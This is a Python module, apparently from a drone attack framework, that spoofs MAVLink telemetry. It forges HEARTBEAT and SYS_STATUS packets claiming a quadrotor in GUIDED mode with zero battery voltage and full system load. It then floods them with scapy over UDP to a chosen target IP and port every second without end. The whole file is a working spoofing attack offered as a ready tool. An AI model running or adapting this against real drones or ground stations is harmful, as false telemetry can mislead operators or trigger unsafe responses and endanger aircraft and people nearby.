from core.base import BaseModule
from pymavlink import mavutil
from scapy.all import *
import time

class SystemIntegrityDeceptionModule(BaseModule):
    def __init__(self):
        super().__init__(
            name="System Integrity Deception",
            description="Spoofs heartbeat and SYS_STATUS messages to indicate a low battery and high load condition.",
            category="System Manipulation"
        )
        self.options = {
            "target_ip": {"value": "", "required": True, "description": "Target IP address"},
            "target_port": {"value": 14550, "required": True, "description": "Target port"}
        }

    def create_heartbeat(self, mav):
        """
        Create a MAVLink heartbeat message.
        """
        heartbeat = mav.heartbeat_encode(
            type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
            autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
            base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            custom_mode=3,  # Custom mode to indicate flying (ArduCopter: GUIDED mode)
            system_status=mavutil.mavlink.MAV_STATE_ACTIVE
        )
        return heartbeat.pack(mav)

    def create_sys_status(self, mav):
        """
        Create a MAVLink SYS_STATUS message with low battery and high load values.
        """
        sys_status = mav.sys_status_encode(
            onboard_control_sensors_present=0b11111111111111111111111111111111,  # All sensors present
            onboard_control_sensors_enabled=0b11111111111111111111111111111111,  # All sensors enabled
            onboard_control_sensors_health=0b11111111111111111111111111111111,  # All sensors healthy
            load=1000,  # System load (0.1% increments)
            voltage_battery=0,  # Battery voltage (mV)
            current_battery=-1,  # Battery current (10 * mA)
            battery_remaining=-1,  # Remaining battery energy (0%: 0, 100%: 100)
            drop_rate_comm=0,  # Communication drop rate (% * 100)
            errors_comm=0,  # Communication errors
            errors_count1=0,  # First sensor error count
            errors_count2=0,  # Second sensor error count
            errors_count3=0,  # Third sensor error count
            errors_count4=0   # Fourth sensor error count
        )
        return sys_status.pack(mav)

    def run(self):
        target_ip = self.options["target_ip"]["value"]
        target_port = int(self.options["target_port"]["value"])

        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1

        while True:
            heartbeat_packet = self.create_heartbeat(mav)
            sys_status_packet = self.create_sys_status(mav)

            self.send_mavlink_packet(heartbeat_packet, target_ip, target_port)
            self.send_mavlink_packet(sys_status_packet, target_ip, target_port)
            
            print(f"Sent heartbeat and SYS_STATUS packets to {target_ip}:{target_port}")
            time.sleep(1)

    def send_mavlink_packet(self, packet_data, target_ip, target_port):
        packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
        send(packet)
